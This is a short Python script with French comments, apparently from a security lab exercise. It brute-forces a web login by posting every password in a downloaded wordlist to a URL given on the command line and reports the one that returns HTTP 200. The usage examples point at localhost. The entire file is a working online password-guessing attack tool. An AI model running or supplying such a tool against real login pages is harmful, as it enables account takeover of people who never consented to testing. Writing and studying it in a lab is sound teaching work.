#!/usr/bin/env python3
"""
bruteforce.py - outil de bruteforce HTTP (repris du TP precedent),
adapte pour cibler une URL passee en argument.

Usage :
    python3 bruteforce.py http://127.0.0.1:5000/login admin wordlist.txt
    python3 bruteforce.py http://127.0.0.1:5000/login admin darkc0de.txt

darkc0de.txt est une wordlist, recuperee depuis SecLists :
https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkc0de.txt
Elle doit etre telechargee/sauvegardee par vous a cote de bruteforce.py.
"""
import sys

import requests


def bruteforce(url, username, chemin_wordlist):
    with open(chemin_wordlist, encoding="utf-8") as f:
        mots = [ligne.strip() for ligne in f if ligne.strip()]

    print(f"[*] Cible : {url}")
    print(f"[*] Compte : {username}")
    print(f"[*] {len(mots)} mots de passe a tester...")

    for mot in mots:
        reponse = requests.post(url, data={"username": username, "password": mot})
        if reponse.status_code == 200:
            print(f"[+] Trouve ! {username} : {mot}")
            return mot
        print(f"[-] {mot} -> {reponse.status_code}")

    print("[!] Aucun mot de passe trouve dans la wordlist.")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 bruteforce.py <url_login> <username> [wordlist.txt]")
        sys.exit(1)

    url_cible = sys.argv[1]
    utilisateur = sys.argv[2]
    wordlist = sys.argv[3] if len(sys.argv) > 3 else "wordlist.txt"
    bruteforce(url_cible, utilisateur, wordlist)
